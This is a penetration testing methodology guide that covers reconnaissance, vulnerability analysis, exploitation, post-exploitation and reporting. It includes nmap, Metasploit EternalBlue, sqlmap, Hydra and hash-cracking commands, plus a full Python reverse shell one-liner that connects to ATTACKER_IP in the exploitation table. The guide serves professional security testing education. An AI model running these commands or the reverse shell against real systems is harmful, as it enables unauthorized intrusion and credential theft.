# Comprehensive Penetration Testing Methodology

This document outlines a detailed penetration testing methodology, covering various phases from initial reconnaissance to final reporting. It includes common tools, techniques, and considerations for each stage.

## 1. Reconnaissance (Information Gathering)

Reconnaissance is the initial phase where an attacker gathers as much information as possible about the target system or network. This can be done passively or actively.

### 1.1. Passive Reconnaissance
Gathering information without directly interacting with the target. This minimizes the risk of detection.

- **WHOIS Lookups**: Obtain domain registration details, including registrant contact information, creation/expiration dates, and nameservers.
  - *Tools*: `whois` command-line tool, online WHOIS services.
- **DNS Enumeration**: Discover DNS records (A, MX, NS, CNAME, TXT) to map out the target's network infrastructure.
  - *Tools*: `dig`, `nslookup`, `host`, DNSdumpster, Sublist3r, fierce.
- **OSINT (Open Source Intelligence)**: Utilize publicly available information from search engines, social media, public records, and news articles.
  - *Tools*: Google Dorks, Maltego, Shodan, Censys.
- **Email Harvesting**: Collect email addresses associated with the target for potential phishing or social engineering attacks.
  - *Tools*: theHarvester, Hunter.io.

### 1.2. Active Reconnaissance
Interacting directly with the target to gather information. This carries a higher risk of detection but provides more accurate and real-time data.

- **Network Scanning (Nmap)**: Identify live hosts, open ports, running services, and their versions.
  ```bash
  # Basic Nmap Scan: Discover open ports and services
  nmap -sS -sV -oN initial_scan.nmap <target_IP>

  # Comprehensive Scan: Includes OS detection, version detection, script scanning, and traceroute
  nmap -sC -sV -O -T4 -oA comprehensive_scan <target_IP>

  # Full Port Scan: Scans all 65535 ports
  nmap -p- --min-rate 1000 -T4 -oN full_port_scan.nmap <target_IP>

  # UDP Scan: Identify open UDP ports (can be slow)
  nmap -sU --top-ports 20 -oN udp_scan.nmap <target_IP>
  ```
- **Vulnerability Scanning**: Use automated scanners to identify known vulnerabilities in services and applications.
  - *Tools*: Nessus, OpenVAS, Qualys, Nikto (web server scanner), WPScan (WordPress scanner).

## 2. Vulnerability Analysis

This phase involves identifying and analyzing weaknesses in the target system that could be exploited.

- **Manual Service Inspection**: Manually examine identified services for misconfigurations, default credentials, or known vulnerabilities not detected by automated scanners.
  - *Techniques*: Banner grabbing, manual web application testing (e.g., checking for common web vulnerabilities like SQL Injection, XSS, CSRF).
- **Automated Vulnerability Scanners**: Utilize tools to automatically detect known vulnerabilities.
  - *Tools*: 
    - **Nessus**: Commercial vulnerability scanner with extensive plugin database.
    - **OpenVAS**: Open-source vulnerability scanner.
    - **Nikto**: Web server scanner that checks for dangerous files/CGIs, outdated server software, and other problems.
    - **Burp Suite (Scanner)**: Integrated web vulnerability scanner in the Pro version.
- **Exploit Database Research**: Cross-reference identified services and versions with public exploit databases (e.g., Exploit-DB, CVE Mitre) to find publicly available exploits.

## 3. Exploitation

Exploitation is the process of leveraging identified vulnerabilities to gain unauthorized access or control over the target system.

### 3.1. Common Exploitation Tools & Techniques

| Tool / Technique | Purpose | Example / Description |
|------------------|---------|-----------------------|
| **Metasploit Framework** | A powerful framework for developing, testing, and executing exploits. | `use exploit/windows/smb/ms17_010_eternalblue` (for EternalBlue) <br> `set RHOSTS <target_IP>` <br> `exploit` <br> Used for creating payloads, listeners, and exploiting various vulnerabilities. |
| **Burp Suite** | An integrated platform for performing security testing of web applications. | Used for intercepting, analyzing, and modifying HTTP requests/responses. Essential for web vulnerability testing (SQLi, XSS, LFI, RCE, etc.). |
| **SQLmap** | Automated SQL injection and database takeover tool. | `sqlmap -u "http://example.com/vuln?id=1" --dbs --batch` <br> Automates the detection and exploitation of SQL injection flaws. |
| **Hydra** | A fast and flexible network logon cracker that supports numerous protocols. | `hydra -L users.txt -P passwords.txt ssh://<target_IP>` <br> Used for brute-forcing login credentials for services like SSH, FTP, HTTP, etc. |
| **John the Ripper / Hashcat** | Password cracking utilities. | `john --wordlist=rockyou.txt hash.txt` <br> `hashcat -m 0 -a 0 hash.txt rockyou.txt` <br> Used to crack password hashes obtained from compromised systems. |
| **Reverse Shells** | A shell session initiated from the target machine back to the attacker's machine. | `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` <br> Crucial for establishing initial access and maintaining persistence. |
| **File Upload Vulnerabilities** | Exploiting insecure file upload functionalities to upload malicious scripts (e.g., web shells). | Bypassing file type restrictions (e.g., `.php` instead of `.php.jpg`). |

## 4. Post-Exploitation

Once initial access is gained, the post-exploitation phase focuses on maintaining access, escalating privileges, and gathering more information.

- **Privilege Escalation**: Attempt to gain higher-level access on the compromised system (e.g., from a regular user to root/administrator).
  - *Linux*: 
    - **Kernel Exploits**: Search for known vulnerabilities in the Linux kernel version.
    - **Misconfigured SUID/SGID Binaries**: Identify binaries that run with elevated privileges.
    - **Cron Jobs**: Look for insecurely configured cron jobs.
    - **Sudo Misconfigurations**: Check `sudo -l` for commands executable without password.
    - *Tools*: LinPEAS, Linux Exploit Suggester.
  - *Windows*: 
    - **Kernel Exploits**: Similar to Linux, search for Windows kernel vulnerabilities.
    - **Service Exploits**: Look for unquoted service paths, weak service permissions.
    - **AlwaysInstallElevated**: Check for misconfigurations that allow non-admin users to install software with elevated privileges.
    - **Token Impersonation**: Exploit Windows tokens.
    - *Tools*: WinPEAS, PowerUp (PowerShell).
- **Lateral Movement**: Expand access to other systems within the network.
  - *Techniques*: Pass-the-hash, Kerberoasting, exploiting trust relationships.
- **Data Exfiltration**: Extract sensitive data from the compromised system.
  - *Techniques*: DNS exfiltration, HTTP/HTTPS tunneling, direct file transfer.
- **Persistence**: Establish methods to maintain access to the system even after reboots or security measures are implemented.
  - *Techniques*: Backdoors, scheduled tasks, rootkits, modifying startup scripts.

## 5. Reporting

The final phase involves documenting all findings, their impact, and recommendations for remediation.

- **Executive Summary**: A high-level overview for management, explaining the scope, key findings, and overall risk posture.
- **Technical Findings**: Detailed descriptions of each vulnerability, including:
  - **Vulnerability Name**: e.g., SQL Injection, Cross-Site Scripting.
  - **Description**: Explanation of the vulnerability.
  - **Impact**: What could happen if exploited (e.g., data breach, remote code execution).
  - **Proof of Concept (PoC)**: Steps to reproduce the vulnerability, including commands, screenshots, and relevant code snippets.
  - **Severity**: CVSS score and qualitative rating (Critical, High, Medium, Low, Informational).
- **Risk Assessment**: Evaluate the likelihood and impact of each vulnerability.
- **Remediation Recommendations**: Provide clear, actionable steps for fixing each vulnerability, including best practices and references to official documentation.
- **Appendices**: Any additional information, such as tool outputs, network diagrams, or raw logs.
